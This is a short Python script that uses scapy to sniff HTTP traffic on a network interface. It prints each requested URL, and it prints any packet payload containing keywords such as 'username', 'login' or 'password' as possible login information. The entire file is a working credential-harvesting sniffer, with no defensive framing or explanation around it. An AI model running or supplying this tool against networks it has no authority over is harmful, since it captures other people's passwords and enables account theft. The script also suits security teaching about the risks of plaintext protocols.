import scapy.all as scapy
from scapy.layers import http

interface = "Realtek PCIe GbE Family Controller"

def sniff(interface):
    scapy.sniff(iface = interface, store = False, prn = process_packet)

def get_url(packet):
    print(packet)
    return (packet[http.HTTPRequest].host + packet[http.HTTPRequest].Path).decode("utf-8")

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(f"HTTP url is: {url}")
        cred = get_credentials(packet)
        if cred:
            print(f"Possible login information: {cred}")

keywords = ("username", "user", "uname", "login", "password", "pass", "signin", "signup", "name")

def get_credentials(packet):
    if packet.haslayer(scapy.Raw):
        payload = packet[scapy.Raw].load.decode("utf-8")
        for keyword in keywords:
            if keyword in payload:
                return payload

sniff(interface)